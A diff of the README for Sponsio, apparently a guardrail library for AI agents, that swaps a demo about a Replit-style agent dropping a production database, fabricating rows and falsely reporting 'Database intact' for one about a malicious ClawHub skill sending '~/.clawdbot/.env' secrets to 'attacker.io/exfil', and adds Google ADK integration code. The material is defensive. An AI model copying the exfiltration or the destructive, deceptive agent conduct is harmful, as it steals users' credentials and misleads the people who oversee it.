@@ -220,23 +220,25 @@ Prompt: *"Process all Q2 invoices within 24 hours."* Among 12 invoices: an $847k
 </details>
 
 <details>
-<summary><b>4. Coding (Replit-style) — Agent violates code freeze, drops prod DB, then lies about it</b></summary>
+<summary><b>4. OpenClaw — Malicious skill exfiltrates <code>.env</code> to AMOS stealer</b></summary>
 
-**Integration**: LangGraph (`guard.wrap(tools)`). **OWASP**: ASI-10 — Rogue Agents · recreates the [July 2025 Replit incident](https://x.com/jasonlk/status/1946069562723897802) cited in [OWASP GenAI's Q1 2026 exploit round-up](https://genai.owasp.org/2026/04/14/owasp-genai-exploit-round-up-report-q1-2026/).
+**Integration**: OpenClaw via [`sponsio-openclaw-shield`](plugins/sponsio-openclaw-shield/) plugin (one-line install). **OWASP**: ASI-04 — Agentic Supply Chain Vulnerabilities · references the [ClawHavoc incident](https://genai.owasp.org/2026/04/14/owasp-genai-exploit-round-up-report-q1-2026/) — 1,184 malicious ClawHub skills shipping AMOS stealer payloads in early 2026.
 
-User says: *"Don't touch the DB — just refactor UserList."* The agent finishes the refactor, then `DROP TABLE`s a "stale" archive, deletes 90-day-stale users on prod, fabricates replacement rows from memory, and reports: *"Database intact. No issues."* *"Code freeze → no destructive SQL"* stops the `DROP` instantly. Three more rules — *"no `INSERT` rebuild"*, *"`escalate` before report"*, *"prod connection → read-only"* — would each have caught the fabricate-and-lie chain alone.
+User installs `weather-skill` from ClawHub. On first invocation the skill reads `~/.clawdbot/.env` — paid AI API keys, OAuth refresh tokens, custom-model endpoints — and POSTs the contents to an attacker-controlled endpoint disguised as a weather API. *"After reading `~/.clawdbot/.env`, no outbound network calls"* + *"`http_request` arguments must not contain `$ENV_*`"* block the exfiltration on the read trigger; the legitimate weather API call (city → forecast JSON) still goes through.
 
 **▶ Without Sponsio**
 
-![Agent violates code freeze — drops table, deletes users, fabricates rows, lies in report](assets/demos/freeze_violation_without.gif)
+<!-- TODO: replace with assets/demos/openclaw_skill_without.gif once recorded -->
+*Demo GIF coming — recorded scenario: skill reads `~/.clawdbot/.env`, then `POST attacker.io/exfil` with the secrets in the body.*
 
 **▶ With Sponsio**
 
-![Sponsio blocks the DROP TABLE on the freeze guard, before any data damage](assets/demos/freeze_violation_cli.gif)
+<!-- TODO: replace with assets/demos/openclaw_skill_cli.gif once recorded -->
+*Demo GIF coming — `sponsio-openclaw-shield` blocks the outbound POST on the `.env` read trigger; weather lookup still completes.*
 
 </details>
 
-Run any of these locally with `sponsio demo --scenario cleanup|backup|wire|freeze`. Source: [examples/demo/](examples/demo/). Full OWASP Agentic Top 10 coverage: [docs/owasp-agentic-top-10.md](docs/owasp-agentic-top-10.md).
+Run any of these locally with `sponsio demo --scenario cleanup|backup|wire|openclaw`. Source: [examples/demo/](examples/demo/). Full OWASP Agentic Top 10 coverage: [docs/owasp-agentic-top-10.md](docs/owasp-agentic-top-10.md).
 
 ---
 
@@ -430,6 +432,37 @@ result = Runner.run_sync(agent, "Deploy v2.1 now.")
 TypeScript: not yet supported.
 
 Runnable: [python](examples/integrations/python/agents_sdk_guard.py)
+
+</details>
+
+<details>
+<summary><b>Google ADK</b> — wrap Agent tools (Gemini)</summary>
+
+```python
+from sponsio.google_adk import Sponsio
+from google.adk.agents.llm_agent import Agent
+
+guard = Sponsio(config="sponsio.yaml", agent_id="travel_agent")
+
+root_agent = Agent(
+    name="travel_agent",
+    model="gemini-flash-latest",
+    instruction="Search before booking. Charge only once.",
+    tools=guard.wrap([search_flights, book_flight, charge_payment]),
+)
+```
+
+```typescript
+import { Sponsio } from "@sponsio/sdk";
+import { wrapGoogleAdkTools } from "@sponsio/sdk/google-adk";
+import { LlmAgent } from "@google/adk";
+
+const guard = new Sponsio({ config: "sponsio.yaml", agentId: "travel_agent" });
+const tools = wrapGoogleAdkTools([searchFlights, bookFlight, chargePayment], guard);
+export const rootAgent = new LlmAgent({ name: "travel_agent", tools, model: "gemini-flash-latest" });
+```
+
+Runnable: [python](examples/integrations/python/google_adk_guard.py) · [typescript](examples/integrations/typescript/google_adk_guard.mjs)
 
 </details>
 
